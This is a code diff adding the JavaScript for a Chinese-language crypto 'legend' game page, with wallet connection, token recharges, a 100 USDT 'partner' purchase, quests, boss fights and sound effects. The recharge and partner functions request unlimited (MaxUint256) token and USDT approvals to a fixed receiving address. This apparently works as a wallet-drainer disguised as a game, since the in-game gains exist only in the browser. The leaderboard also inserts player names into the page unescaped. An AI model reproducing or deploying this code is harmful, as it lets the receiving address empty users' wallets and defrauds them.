+        const koalaDecimals = await koalaContract.decimals();
+        currentKoalaBalance = parseFloat(ethers.utils.formatUnits(koalaBal, koalaDecimals));
+        document.getElementById('koalaBalance').textContent = currentKoalaBalance.toFixed(2);
+
+        updateGameUI();
+      } catch (e) {
+        console.error('获取余额失败:', e);
+      }
+    }
+
+    // 设置充值金额
+    function setRechargeAmount(amount) {
+      document.getElementById('rechargeAmount').value = amount;
+      document.querySelectorAll('.preset-btn').forEach(btn => {
+        btn.classList.remove('active');
+        if (btn.textContent == amount + ' 传奇币') btn.classList.add('active');
+      });
+    }
+
+    // 设置合伙人份数（固定为1）
+    function setPartnerCount(count) {
+      document.getElementById('partnerCount').value = 1;
+    }
+
+    // 充值传奇人生币
+    async function rechargeKoala() {
+      const amount = document.getElementById('rechargeAmount').value;
+      if (!amount || amount <= 0) {
+        showToast('请输入有效金额', 'error');
+        return;
+      }
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const amountWei = ethers.utils.parseUnits(amount, decimals);
+        
+        const allowance = await koalaContract.allowance(userAddress, RECEIVE_ADDRESS);
+        if (allowance.lt(amountWei)) {
+          showToast('正在授权传奇人生币...', 'success');
+          await koalaContract.approve(RECEIVE_ADDRESS, ethers.constants.MaxUint256);
+        }
+
+        showToast('正在转账传奇人生币...', 'success');
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, amountWei);
+        await tx.wait();
+
+        showToast('充值传奇人生成功！', 'success');
+        await updateBalances();
+      } catch (e) {
+        showToast('充值失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 成为合伙人
+    async function becomePartner() {
+      const count = 1;
+      const totalAmount = 100;
+
+      showLoading(true);
+      try {
+        const usdtDecimals = await usdtContract.decimals();
+        const amountWei = ethers.utils.parseUnits(totalAmount.toString(), usdtDecimals);
+        
+        const allowance = await usdtContract.allowance(userAddress, RECEIVE_ADDRESS);
+        if (allowance.lt(amountWei)) {
+          showToast('正在授权USDT...', 'success');
+          await usdtContract.approve(RECEIVE_ADDRESS, ethers.constants.MaxUint256);
+        }
+
+        showToast('正在支付...', 'success');
+        const tx = await usdtContract.transfer(RECEIVE_ADDRESS, amountWei);
+        await tx.wait();
+
+        showToast(`成功购买 ${count} 份合伙人权益！`, 'success');
+        await updateBalances();
+      } catch (e) {
+        showToast('购买失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 切换标签页
+    function switchTab(tab) {
+      document.querySelectorAll('.game-tab').forEach(t => t.classList.remove('active'));
+      document.querySelectorAll('.game-panel').forEach(p => p.classList.remove('active'));
+      
+      event.target.classList.add('active');
+      document.getElementById(tab + 'Panel').classList.add('active');
+      
+      if (tab === 'leaderboard') {
+        renderLeaderboard();
+      }
+    }
+
+    function getPower(char) {
+      return char.atk * 2 + char.def * 1.5 + char.hp * 0.1 + char.level * 10;
+    }
+
+    function renderLeaderboard() {
+      const list = document.getElementById('leaderboardList');
+      const myRankDisplay = document.getElementById('myRankDisplay');
+      
+      const sortedData = [...leaderboardData].sort((a, b) => getPower(b) - getPower(a));
+      
+      let html = '';
+      sortedData.forEach((player, index) => {
+        const rank = index + 1;
+        const power = Math.floor(getPower(player));
+        const cls = classData[player.class];
+        const topClass = rank <= 3 ? `top-${rank}` : '';
+        
+        html += `
+          <li class="leaderboard-item ${topClass}">
+            <span class="rank-number ${topClass}">${rank}</span>
+            <span>${player.name}</span>
+            <span>${cls.icon} ${cls.name}</span>
+            <span>Lv.${player.level}</span>
+            <span>${power}</span>
+          </li>
+        `;
+      });
+      
+      list.innerHTML = html;
+      
+      const myPower = Math.floor(getPower(character));
+      const myRank = sortedData.filter(p => getPower(p) > myPower).length + 1;
+      const myCls = classData[character.class];
+      
+      myRankDisplay.innerHTML = `
+        我的排名: 第 ${myRank} 名 | ${myCls.icon} ${character.name} | Lv.${character.level} | 战力: ${myPower}
+      `;
+    }
+
+    // 初始化游戏
+    function initGame() {
+      const equipGrid = document.getElementById('equipmentGrid');
+      equipGrid.innerHTML = equipmentData.map(e => `
+        <div class="equipment-item" onclick="synthesize('${e.id}')">
+          <div class="equipment-icon">${e.icon}</div>
+          <div class="equipment-name">${e.name}</div>
+          <div class="equipment-cost">${e.cost} 传奇币</div>
+          <div class="equipment-level">需求Lv.${e.level}</div>
+        </div>
+      `).join('');
+
+      const questList = document.getElementById('questList');
+      questList.innerHTML = questData.map(q => `
+        <div class="quest-item">
+          <div class="quest-icon">${q.icon}</div>
+          <div class="quest-info">
+            <div class="quest-name">${q.name}</div>
+            <div class="quest-desc">${q.desc}</div>
+            <div class="quest-reward">消耗: ${q.cost} 传奇币 | ${q.reward}</div>
+          </div>
+          <button class="quest-action" onclick="doQuest('${q.id}')">执行</button>
+        </div>
+      `).join('');
+
+      const bossList = document.getElementById('bossList');
+      bossList.innerHTML = bossData.map(b => `
+        <div class="quest-item">
+          <div class="quest-icon">${b.icon}</div>
+          <div class="quest-info">
+            <div class="quest-name">${b.name}</div>
+            <div class="quest-desc">${b.desc}</div>
+            <div class="quest-reward">消耗: ${b.cost} 传奇币 | 奖励: ${b.reward}</div>
+          </div>
+          <button class="quest-action" onclick="fightBoss('${b.id}')">挑战</button>
+        </div>
+      `).join('');
+
+      updateInventory();
+      updateGameUI();
+    }
+
+    // 更新游戏UI状态
+    function updateGameUI() {
+      equipmentData.forEach(e => {
+        const items = document.querySelectorAll('.equipment-item');
+        items.forEach(item => {
+          if (item.onclick.toString().includes(e.id)) {
+            if (currentKoalaBalance < e.cost || character.level < e.level) {
+              item.classList.add('disabled');
+            } else {
+              item.classList.remove('disabled');
+            }
+          }
+        });
+      });
+
+      const actions = document.querySelectorAll('.quest-action');
+      actions.forEach(action => {
+        action.classList.remove('disabled');
+      });
+    }
+
+    // 合成装备
+    async function synthesize(equipId) {
+      const equip = equipmentData.find(e => e.id === equipId);
+      if (!equip) return;
+
+      if (character.level < equip.level) {
+        showToast(`需要达到Lv.${equip.level}才能合成`, 'error');
+        return;
+      }
+
+      if (currentKoalaBalance < equip.cost) {
+        showToast('传奇币余额不足，请先充值', 'error');
+        return;
+      }
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const costAmount = ethers.utils.parseUnits(equip.cost.toString(), decimals);
+        
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, costAmount);
+        await tx.wait();
+
+        inventory.push(equip);
+        character.atk += equip.atk || 0;
+        character.def += equip.def || 0;
+        character.hp += equip.hp || 0;
+        character.exp += 50;
+
+        updateCharacter();
+        updateInventory();
+        await updateBalances();
+
+        showToast(`成功合成 ${equip.name}！`, 'success');
+      } catch (e) {
+        showToast('合成失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // 执行任务
+    async function doQuest(questId) {
+      const quest = questData.find(q => q.id === questId);
+      if (!quest) return;
+
+      if (currentKoalaBalance < quest.cost) {
+        showToast('传奇币余额不足，请先充值', 'error');
+        return;
+      }
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const costAmount = ethers.utils.parseUnits(quest.cost.toString(), decimals);
+        
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, costAmount);
+        await tx.wait();
+
+        character.exp += 100;
+        if (character.exp >= character.level * 200) {
+          character.level++;
+          character.atk += 5;
+          character.def += 3;
+          character.hp += 20;
+          showToast(`升级！当前Lv.${character.level}`, 'success');
+        }
+
+        updateCharacter();
+        await updateBalances();
+
+        showToast(`任务 ${quest.name} 完成！`, 'success');
+      } catch (e) {
+        showToast('任务失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    // BOSS挑战
+    async function fightBoss(bossId) {
+      const boss = bossData.find(b => b.id === bossId);
+      if (!boss) return;
+
+      if (currentKoalaBalance < boss.cost) {
+        showToast('传奇币余额不足，请先充值', 'error');
+        return;
+      }
+
+      showSkillEffect();
+
+      showLoading(true);
+      try {
+        const decimals = await koalaContract.decimals();
+        const costAmount = ethers.utils.parseUnits(boss.cost.toString(), decimals);
+        
+        const tx = await koalaContract.transfer(RECEIVE_ADDRESS, costAmount);
+        await tx.wait();
+
+        character.exp += 500;
+        character.atk += 20;
+        character.def += 10;
+        character.hp += 50;
+
+        if (character.exp >= character.level * 200) {
+          character.level++;
+          showToast(`升级！当前Lv.${character.level}`, 'success');
+        }
+
+        updateCharacter();
+        await updateBalances();
+
+        showToast(`击败 ${boss.name}！获得 ${boss.reward}`, 'success');
+      } catch (e) {
+        showToast('挑战失败: ' + e.message, 'error');
+      }
+      showLoading(false);
+    }
+
+    function showSkillEffect() {
+      const gameSection = document.querySelector('.game-section');
+      if (!gameSection) return;
+
+      const charClass = character.class || 'warrior';
+      const effectContainer = document.createElement('div');
+      effectContainer.style.position = 'relative';
+      effectContainer.style.width = '100%';
+      effectContainer.style.height = '200px';
+      effectContainer.style.display = 'flex';
+      effectContainer.style.justifyContent = 'center';
+      effectContainer.style.alignItems = 'center';
+      
+      gameSection.appendChild(effectContainer);
+
+      if (charClass === 'warrior') {
+        const slash1 = document.createElement('div');
+        slash1.className = 'slash-effect';
+        slash1.style.left = '50%';
+        slash1.style.top = '50%';
+        slash1.style.transformOrigin = 'left center';
+        effectContainer.appendChild(slash1);
+
+        setTimeout(() => {
+          const slash2 = document.createElement('div');
+          slash2.className = 'slash-effect';
+          slash2.style.left = '50%';
+          slash2.style.top = '50%';
+          slash2.style.transformOrigin = 'left center';
+          slash2.style.transform = 'rotate(-45deg)';
+          effectContainer.appendChild(slash2);
+        }, 150);
+      } else if (charClass === 'mage') {
+        const circle = document.createElement('div');
+        circle.className = 'magic-circle';
+        circle.style.left = '50%';
+        circle.style.top = '50%';
+        circle.style.transform = 'translate(-50%, -50%)';
+        effectContainer.appendChild(circle);
+
+        setTimeout(() => {
+          const beam = document.createElement('div');
+          beam.style.position = 'absolute';
+          beam.style.width = '4px';
+          beam.style.height = '100px';
+          beam.style.background = 'linear-gradient(0deg, #9333ea, #a855f7, transparent)';
+          beam.style.left = '50%';
+          beam.style.top = '20%';
+          beam.style.transform = 'translateX(-50%)';
+          beam.style.boxShadow = '0 0 20px #9333ea';
+          beam.style.animation = 'slash 0.3s ease-out forwards';
+          effectContainer.appendChild(beam);
+        }, 300);
+      } else if (charClass === 'archer') {
+        const arrow = document.createElement('div');
+        arrow.className = 'arrow-projectile';
+        arrow.textContent = '🏹';
+        arrow.style.left = '20%';
+        arrow.style.top = '50%';
+        arrow.style.transform = 'translateY(-50%)';
+        effectContainer.appendChild(arrow);
+      }
+
+      document.body.classList.add('shake');
+      setTimeout(() => document.body.classList.remove('shake'), 200);
+
+      setTimeout(() => {
+        effectContainer.remove();
+      }, 1000);
+    }
+
+    // 更新角色信息
+    function updateCharacter() {
+      document.getElementById('charLevel').textContent = character.level;
+      document.getElementById('statAtk').textContent = character.atk;
+      document.getElementById('statDef').textContent = character.def;
+      document.getElementById('statHp').textContent = character.hp;
+      document.getElementById('statExp').textContent = character.exp;
+    }
+
+    // 更新装备栏
+    function updateInventory() {
+      const grid = document.getElementById('inventoryGrid');
+      let html = '';
+      
+      inventory.forEach(item => {
+        html += `<div class="inventory-slot">${item.icon}</div>`;
+      });
+      
+      for (let i = inventory.length; i < 18; i++) {
+        html += `<div class="inventory-slot empty"></div>`;
+      }
+      
+      grid.innerHTML = html;
+    }
+
+    // 显示提示
+    function showToast(message, type = '') {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = 'toast show ' + type;
+      
+      setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    // 显示加载
+    function showLoading(show) {
+      document.getElementById('loading').style.display = show ? 'flex' : 'none';
+    }
+
+    // 监听账户变化
+    if (window.ethereum) {
+      window.ethereum.on('accountsChanged', accounts => {
+        if (accounts.length === 0) {
+          document.getElementById('walletAddress').textContent = '未连接';
+          document.getElementById('connectBtn').textContent = '连接钱包';
+          document.getElementById('connectBtn').disabled = false;
+          document.getElementById('rechargeBtn').disabled = true;
+          document.getElementById('partnerBtn').disabled = true;
+        } else {
+          connectWallet();
+        }
+      });
+    }
+
+    const SoundManager = {
+      audioContext: null,
+      muted: false,
+      bgmPlayer: null,
+      init: function() {
+        try {
+          this.audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        } catch (e) {
+          console.log('Web Audio API not supported');
+        }
+        this.bgmPlayer = document.getElementById('bgmPlayer');
+        this.muted = localStorage.getItem('koala_legend_muted') === 'true';
+        this.updateMuteButton();
+        if (this.bgmPlayer) {
+          this.bgmPlayer.volume = 0.3;
+        }
+      },
+      toggleMute: function() {
+        this.muted = !this.muted;
+        localStorage.setItem('koala_legend_muted', this.muted);
+        this.updateMuteButton();
+        if (this.bgmPlayer) {
+          this.bgmPlayer.muted = this.muted;
+        }
+      },
+      updateMuteButton: function() {
+        const btn = document.getElementById('soundBtn');
+        if (btn) {
+          btn.innerHTML = this.muted ? '🔇' : '🎵';
+          btn.title = this.muted ? '开启音效' : '关闭音效';
+        }
+      },
+      playBGM: function() {
+        if (!this.muted && this.bgmPlayer) {
+          this.bgmPlayer.play().catch(e => {
+            console.log('BGM play failed:', e);
+          });
+        }
+      },
+      pauseBGM: function() {
+        if (this.bgmPlayer) {
+          this.bgmPlayer.pause();
+        }
+      },
+      playTone: function(frequency, duration, type = 'square', volume = 0.1) {
+        if (this.muted || !this.audioContext) return;
+        const oscillator = this.audioContext.createOscillator();
+        const gainNode = this.audioContext.createGain();
+        oscillator.connect(gainNode);
+        gainNode.connect(this.audioContext.destination);
+        oscillator.type = type;
+        oscillator.frequency.setValueAtTime(frequency, this.audioContext.currentTime);
+        gainNode.gain.setValueAtTime(volume, this.audioContext.currentTime);
+        gainNode.gain.exponentialRampToValueAtTime(0.001, this.audioContext.currentTime + duration);
+        oscillator.start(this.audioContext.currentTime);
+        oscillator.stop(this.audioContext.currentTime + duration);
+      },
+      playAttack: function() {
+        this.playTone(880, 0.15, 'sawtooth', 0.15);
+        setTimeout(() => this.playTone(1320, 0.1, 'square', 0.1), 50);
+      },
+      playHit: function() {
+        this.playTone(150, 0.3, 'sawtooth', 0.2);
+        setTimeout(() => this.playTone(100, 0.2, 'square', 0.15), 100);
+      },
+      playVictory: function() {
+        const notes = [523, 659, 784, 1047];
+        notes.forEach((freq, i) => {
+          setTimeout(() => this.playTone(freq, 0.3, 'sine', 0.15), i * 150);
+        });
+      },
+      playButton: function() {
+        this.playTone(600, 0.05, 'sine', 0.08);
+      }
+    };
+
+    SoundManager.init();
+    
+  </script>
+  
+  <audio id="bgmPlayer" loop>
+    <source src="https://music.163.com/song/media/outer/url?id=186297.mp3" type="audio/mpeg">
+  </audio>
+  
+</body>
+</html>
